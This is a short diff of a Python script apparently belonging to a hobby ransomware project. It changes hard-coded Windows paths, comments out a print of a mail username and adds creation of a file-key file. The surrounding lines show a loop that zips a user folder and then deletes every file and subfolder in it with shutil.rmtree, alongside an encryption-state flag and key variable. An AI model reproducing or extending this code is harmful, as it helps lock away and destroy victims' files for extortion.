@@ -18,7 +18,11 @@ from requests import get
 
 load_dotenv("./config/.env")
 
-print(os.environ.get('MAIL_USER'))
+#print(os.environ.get('MAIL_USER'))
+
+#Check if File key exists
+if not exists('config/filekey.key'):
+    open('config/filekey.key', 'w')
 
 criptografadoNesteMomento = False
 key = ''.encode()
@@ -73,12 +77,12 @@ while True:
         finally:
             zip_file.close()
 
-    zip_folderPyzipper('C:/Users\jeffe\python/ransomware/usuario',
+    zip_folderPyzipper('E:\Projetos\DesktopApps\ransomware/usuario',
                        'C:/Users\jeffe\python\ransomware')
 
-    for filename in os.listdir('C:/Users\jeffe\python/ransomware/usuario'):
+    for filename in os.listdir('E:\Projetos\DesktopApps\ransomware/usuario'):
         filepath = os.path.join(
-            'C:/Users\jeffe\python/ransomware/usuario', filename)
+            'E:\Projetos\DesktopApps\ransomware/usuario', filename)
         try:
             shutil.rmtree(filepath)
         except OSError:
